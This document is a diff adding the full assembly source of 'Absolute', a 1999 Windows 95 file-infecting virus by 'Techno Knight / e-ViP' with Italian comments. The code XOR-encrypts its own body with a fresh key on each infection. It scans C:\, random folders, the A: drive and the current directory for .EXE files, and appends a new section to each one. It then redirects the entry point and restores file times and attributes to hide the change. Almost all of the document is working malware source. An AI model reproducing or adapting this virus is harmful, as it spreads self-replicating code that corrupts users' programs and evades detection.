@@ -1,0 +1,511 @@
+;    ______ _______ ______   _____ ___             ________ ______
+;   /      \   __  \ _____\ /     \   | |\       /|__    __|   ___|
+;  |   __   |  \_|_/ \____ |   |   |  | | |     | |  |  |  |  |___
+;  |   \/   |  __  \\___  || -<_>- |  | | |     | |  |  |  |   ___|
+;  |   __   |  \_|  |___| ||   |   |  |_|_ \___/  |  |  |  |  |___
+;  |__|  |__|______/______| \_____/_______|______/   |__|  |______|
+;                                                                         
+;                       by Techno Knight/e-ViP
+;
+; Name           : Absolute
+; Author         : Techno Knight / e-ViP
+; Origin         : Italy - June 1999              
+;
+; La routine di infezione e' la stessa di Sabotagio, e usa anche il
+; metodo hard coded, ma si comporta diversamente e si cripta ad ogni
+; infezione (niente motore polimorfico ancora :( )
+;
+
+
+.386p
+.387
+.model flat,STDCALL
+locals        
+jumps
+
+
+Size EQU OFFSET TheEnd-OFFSET Start
+SizeNotCrypted EQU OFFSET Crypted-OFFSET Start
+SizeCrypted EQU OFFSET EndCrypted-OFFSET Crypted
+        
+
+.DATA
+
+db 0
+
+.CODE
+
+Start:
+
+        CALL    GetDelta
+
+GetDelta:
+        POP     EBP
+        SUB     EBP,OFFSET GetDelta
+
+
+        LEA     EAX,[EBP+OFFSET Start]
+        MOV     ECX,Size
+        CALL    VirtualProtect95,EAX,ECX,4,0
+                                
+        CMP     EBP,0
+        JE      FirstGeneration95
+
+        LEA     ESI,[EBP+OFFSET Crypted]
+        MOV     ECX,EndCrypted-Crypted
+        MOV     AL,byte ptr[EBP+OFFSET Key]
+        
+DecryptByte:
+        XOR     byte ptr[ESI],AL
+        INC     ESI
+        LOOP    DecryptByte     
+
+        
+Crypted:
+        MOV     EAX,dword ptr[EBP+OFFSET NewIP]
+        MOV     dword ptr[EBP+OFFSET OldIP],EAX
+        MOV     EAX,dword ptr[EBP+OFFSET NewImageBase]
+        MOV     dword ptr[EBP+OFFSET OldImageBase],EAX
+
+                                        
+        LEA     EAX,[EBP+OFFSET StartDir]
+        CALL    GetCurDir95,EAX,128h
+
+        LEA     EAX,[EBP+OFFSET RootDir]
+        CALL    SetCurDir95,EAX
+                                
+        CALL    Infect95
+                        
+        MOV     ECX,2
+Random:
+        PUSH    ECX
+        IN      AL,40h
+        AND     AL,24
+        ADD     AL,64 
+        MOV     [EBP+OFFSET DirMask+1],AL
+        LEA     EAX,[EBP+OFFSET DirFindBuffer]
+        LEA     EDX,[EBP+OFFSET DirMask]
+        CALL    FindFirst95,EDX,EAX
+        CMP     EAX,0
+        JE      NotFound
+        LEA     EAX,[EBP+OFFSET DirFindBuffer.FileName]
+        CALL    SetCurDir95,EAX
+        
+        CALL    Infect95
+NotFound:
+        POP     ECX
+        LOOP    Random
+
+
+        LEA     EAX,[EBP+OFFSET ADir]
+        CALL    SetCurDir95,EAX
+                                
+        CALL    Infect95
+
+
+        LEA     EAX,[EBP+OFFSET StartDir]
+        CALL    SetCurDir95,EAX
+                                                                
+        MOV     EAX,dword ptr[EBP+OFFSET OldIP]
+        ADD     EAX,dword ptr[EBP+OFFSet OldImageBase]
+        JMP     EAX
+                                                        
+                
+FirstGeneration95:                                
+        CALL    Infect95
+        CALL    ExitProcess95,0
+
+
+
+MapViewOfFile95:
+        PUSH 0BFF7FBF4h
+        JMP [EBP + OFFSET Kernel]
+
+
+UnMapViewOfFile95:
+        PUSH 0BFF81750h
+        JMP [EBP + OFFSET Kernel]
+
+CreateFileMapping95:
+        PUSH 0BFF773FDh
+        JMP [EBP + OFFSET Kernel]
+
+CloseHandle95:
+        PUSH 0BFF7BC72h
+        JMP [EBP + OFFSET Kernel]
+
+
+SetEndOfFile95:
+        PUSH 0BFF990FEh
+        JMP [EBP + OFFSET Kernel]
+
+
+SetFilePointer95:
+        PUSH 0BFF76FA0h
+        JMP [EBP + OFFSET Kernel]
+                
+
+GetFileSize95:
+        PUSH 0BFF76E60h
+        JMP [EBP + OFFSET Kernel]
+
+GetFileAttributes95:
+        PUSH 0BFF7786Ch
+        JMP [EBP + OFFSET Kernel]
+
+SetFileAttributes95:
+        PUSH 0BFF7784Ch
+        JMP [EBP + OFFSET Kernel]
+
+GetFileTime95:
+        PUSH 0BFF76FC1h
+        JMP [EBP + OFFSET Kernel]
+
+SetFileTime95:
+        PUSH 0BFF77000h
+        JMP [EBP + OFFSET Kernel]
+                        
+
+ExitProcess95:
+        PUSH 0BFF8AFB0h
+        JMP [EBP + OFFSET Kernel]
+                        
+
+GetCurDir95:
+        PUSH 0BFF77744h            
+        JMP [EBP + OFFSET Kernel]
+
+SetCurDir95:
+        PUSH 0BFF7771Dh            
+        JMP [EBP + OFFSET Kernel]
+
+GetWinDir95:
+        PUSH 0BFF776E4h            
+        JMP [EBP + OFFSET Kernel]
+                
+
+FindFirst95:
+        PUSH 0BFF77893h   
+        JMP [EBP + OFFSET Kernel]
+        
+FindNext95:
+        PUSH 0BFF778CBh   
+        JMP [EBP + OFFSET Kernel]
+
+CreateFile95:
+        PUSH 0BFF77817h   
+        JMP [EBP + OFFSET Kernel]
+
+GetDate95:
+        PUSH 0BFF9D14Eh
+        JMP [EBP + OFFSET Kernel]
+
+
+                                
+Infect95         PROC
+
+                                                                                        
+        MOV     byte ptr[EBP+OFFSET Infections],2
+
+        LEA     EAX,[EBP+OFFSET FindBuffer]
+        LEA     EDX,[EBP+OFFSET ExeMask]
+        CALL    FindFirst95,EDX,EAX
+        MOV     dword ptr[EBP+OFFSET FindHandle],EAX
+                        
+
+Open:
+        CMP     EAX,0
+        JNE     OkFile
+
+Stop:
+        RET
+OkFile:
+                                        
+        LEA     EAX,[EBP+OFFSET FindBuffer.FileName]
+        CALL    GetFileAttributes95,EAX
+        MOV     dword ptr[EBP+OFFSET OldAttributes],EAX
+                                
+        LEA     EAX,[EBP+OFFSET FindBuffer.FileName]
+        CALL    SetFileAttributes95,EAX,20h
+
+        LEA     EAX,[EBP+OFFSET FindBuffer.FileName]
+        CALL    CreateFile95,EAX,80000000h+40000000h,1,0,3,0,0
+        MOV     dword ptr[EBP+OFFSET FileHandle],EAX
+                                      
+        CALL    GetFileSize95,dword ptr[EBP+OFFSET FileHandle],0
+        MOV     dword ptr[EBP+OFFSET NewFileSize],EAX
+
+        ADD     EAX,Size
+        ADD     EAX,1000h
+        MOV     dword ptr[EBP+OFFSET Memory],EAX
+        
+        LEA     EAX,[EBP+OFFSET Time1]
+        LEA     ECX,[EBP+OFFSET Time2]
+        LEA     EDX,[EBP+OFFSET Time3]
+        CALL    GetFileTime95,dword ptr[EBP+OFFSET FileHandle],EAX,ECX,EDX
+
+Map:                            
+        CALL    CreateFileMapping95,dword ptr[EBP+OFFSET FileHandle],0,4,0,dword ptr[EBP+OFFSET Memory],0
+        MOV     dword ptr[EBP+OFFSET MapHandle],EAX
+        CALL    MapViewOfFile95,dword ptr[EBP+OFFSET MapHandle],2,0,0,dword ptr[EBP+OFFSET Memory]
+        MOV     dword ptr[EBP+OFFSET MapAddress],EAX
+
+        MOV     ESI,EAX
+
+
+        INC     byte ptr[EBP+OFFSET Infections]
+        CMP     word ptr[ESI],'ZM'
+        JNE     UnMap
+        DEC     byte ptr[EBP+OFFSET Infections]
+
+
+        INC     byte ptr[EBP+OFFSET Infections]
+        CMP     word ptr[ESI+38h],'0p'
+        JE      UnMap
+        DEC     byte ptr[EBP+OFFSET Infections]
+
+
+        MOV     EBX,dword ptr[ESI+3ch]
+        INC     byte ptr[EBP+OFFSET Infections]
+        CMP     word ptr[ESI+EBX],'EP'
+        JNE     UnMap
+        DEC     byte ptr[EBP+OFFSET Infections]
+                                
+        MOV     word ptr[ESI+38h],'0p'
+
+        ADD     ESI,EBX
+        MOV     dword ptr[EBP+OFFSET PEStart],ESI
+
+        MOV     EAX,[ESI+28h]
+        MOV     dword ptr[EBP+OFFSET NewIP],EAX
+
+        MOV     EAX,[ESI+52]
+        MOV     dword ptr[EBP+OFFSET NewImageBase],EAX
+                        
+        MOV     EAX,[ESI+3Ch]
+        MOV     dword ptr[EBP+OFFSET FileAlign],EAX
+
+        MOV     EAX,[ESI+38h]
+        MOV     dword ptr[EBP+OFFSET SectionAlign],EAX
+
+
+        MOV     EAX,[ESI+80]
+        MOV     dword ptr[EBP+OFFSET ImageSize],EAX
+
+
+        MOV     EBX,[ESI+74h]
+        SHL     EBX,3
+        XOR     EAX,EAX
+        MOV     AX,word ptr[ESI+6]
+        MOV     ECX,28h
+        MUL     ECX
+        ADD     ESI,78h
+        ADD     ESI,EBX
+        ADD     ESI,EAX
+
+        LEA     EDI,[EBP+OFFSET NewObject]
+        XCHG    EDI,ESI
+
+
+        MOV     EAX,[EDI-40+8]
+        ADD     EAX,[EDI-40+12]
+        MOV     ECX,dword ptr[EBP+OFFSET SectionAlign]
+        XOR     EDX,EDX
+        DIV     ECX
+        INC     EAX
+        MUL     ECX
+        MOV     dword ptr[EBP+OFFSET RVA],EAX
+
+        MOV     ECX,dword ptr[EBP+OFFSET FileAlign]
+        MOV     EAX,Size
+        XOR     EDX,EDX
+        DIV     ECX
+        INC     EAX
+        MUL     ECX
+        MOV     dword ptr[EBP+OFFSET PhysicalSize],EAX
+
+        MOV     ECX,dword ptr[EBP+OFFSET SectionAlign]
+        MOV     EAX,Size+1000h
+        XOR     EDX,EDX
+        DIV     ECX
+        INC     EAX
+        MUL     ECX
+        MOV     dword ptr[EBP+OFFSET VirtualSize],EAX
+
+
+        MOV     EAX,[EDI-40+20]
+        ADD     EAX,[EDI-40+16]
+        MOV     ECX,dword ptr[EBP+OFFSET FileAlign]
+        XOR     EDX,EDX
+        DIV     ECX
+        INC     EAX
+        MUL     ECX
+        MOV     dword ptr[EBP+OFFSET PhysicalOffset],EAX
+
+        MOV     dword ptr[EBP+OFFSET NewFileSize],EAX
+        ADD     dword ptr[EBP+OFFSET NewFileSize],Size
+
+        MOV     ECX,10
+        REP     MOVSD
+
+        IN      AL,40h                          
+        MOV     byte ptr[EBP+OFFSET Key],AL
+                                                                   
+        MOV     EDI,dword ptr[EBP+OFFSET MapAddress]
+        ADD     EDI,dword ptr[EBP+OFFSET PhysicalOffset]
+        LEA     ESI,[EBP+OFFSET Start]
+        MOV     ECX,SizeNotCrypted
+        CLD
+        REP     MOVSB
+        MOV     ECX,SizeCrypted
+MoveByte:
+        LODSB
+        XOR     AL,byte ptr[EBP+OFFSET Key]
+        STOSB
+        LOOP    MoveByte
+        MOV     ECX,TheEnd-EndCrypted
+        REP     MOVSB
+
+        MOV     ESI,dword ptr[EBP+OFFSET PEStart]
+        INC     word ptr[ESI+6]
+
+        MOV     EAX,dword ptr[EBP+OFFSET RVA]
+        MOV     [ESI+28h],EAX
+
+        MOV     EAX,Size+1000h
+        ADD     EAX,dword ptr[EBP+OFFSET ImageSize]
+        MOV     ECX,dword ptr[EBP+OFFSET SectionAlign]
+        XOR     EDX,EDX
+        DIV     ECX
+        INC     EAX
+        MUL     ECX
+        MOV     dword ptr[EBP+OFFSET ImageSize],EAX
+        MOV     [ESI+80],EAX
+
+        
+UnMap:
+                        
+        CALL    UnMapViewOfFile95,dword ptr[EBP+OFFSET MapAddress]
+        CALL    CloseHandle95,dword ptr[EBP+OFFSET MapHandle]
+        
+
+NuovoEOF:
+                                
+        CALL    SetFilePointer95,dword ptr[EBP+OFFSET FileHandle],dword ptr[EBP+OFFSET NewFileSize],0,0
+        CALL    SetEndOfFile95,dword ptr[EBP+OFFSET FileHandle]
+                                                
+                 
+Close:
+
+
+        LEA     EAX,[EBP+OFFSET Time1]
+        LEA     ECX,[EBP+OFFSET Time2]
+        LEA     EDX,[EBP+OFFSET Time3]
+        CALL    SetFileTime95,dword ptr[EBP+OFFSET FileHandle],EAX,ECX,EDX
+                        
+        CALL    CloseHandle95,dword ptr[EBP+OFFSET FileHandle]
+
+        LEA     EAX,[EBP+OFFSET FindBuffer.FileName]
+        CALL    SetFileAttributes95,EAX,dword ptr[EBP+OFFSET OldAttributes]
+                                
+        CMP     byte ptr[EBP+OFFSET Infections],0
+        JE      Finished
+        DEC     byte ptr[EBP+OFFSET Infections]
+        LEA     EAX,[EBP+OFFSET FindBuffer]
+        CALL    FindNext95,dword ptr[EBP+OFFSET FindHandle],EAX
+        JMP     Open
+                                           
+Finished:
+
+
+RET
+
+Infect95         ENDP
+                
+
+
+Variabili:
+        
+ExeMask         DB '*.EXE',0
+DirMask         DB '* *. ',0                
+
+FileTime        STRUC
+
+        FT_dwLowDateTime  DD ?
+        FT_dwHighDateTime DD ?
+
+FileTime        ENDS
+                        
+
+        
+FileBuffer      STRUC
+
+        FileAttributes     DD       ?
+        CreationTime       FileTime ?
+        LastAccessTime     FileTime ?
+        LastWriteTime      FileTime ?
+        FileSizeHigh       DD       ?
+        FileSizeLow        DD       ?
+        Reserved0          DD       ?
+        Reserved1          DD       ?
+        FileName           DB 260 dup (?)
+        AlternateFileName  DB 13  dup (?)
+                           DB 3   dup (?)
+
+FileBuffer      ENDS
+
+FindBuffer   FileBuffer      ?
+DirFindBuffer FileBuffer      ?
+
+
+NewObject:
+OName           DB '.e-ViP  '
+VirtualSize     DD 0
+RVA             DD 0
+PhysicalSize    DD 0
+PhysicalOffset  DD 0
+Reserved        DD 0,0,0
+Flags           DB 40h,0,0,0C0h
+
+
+FindHandle      DD      ?
+FileHandle      DD      ?
+MapHandle       DD      ?
+MapAddress      DD      ?
+                        
+Infections      DB      0
+
+OldAttributes   DD      0
+Time1           DQ      0
+Time2           DQ      0
+Time3           DQ      0
+                
+Memory          DD      0
+NewFileSize     DD      ?
+NewImageSize    DD      ?
+PEStart         DD      ?
+NewIP           DD      ?
+OldIP           DD      ?
+FileAlign       DD      ?
+SectionAlign    DD      ?
+ImageSize       DD      ?
+NewImageBase    DD      ?
+OldImageBase    DD      ?
+                                                                                                                
+StartDir        DB      128h    DUP(?)
+RootDir         DB      'c:\\',0
+ADir            DB      'a:\\',0
+
+                                                               
+EndCrypted:
+
+Key             DB      ?
+Kernel          DD      0BFF93C1dh
+VirtualProtect95:
+        PUSH    0BFF9CCFBh
+        JMP     [EBP+Kernel]     
+                                                        
+
+TheEnd:
+end Start
+end
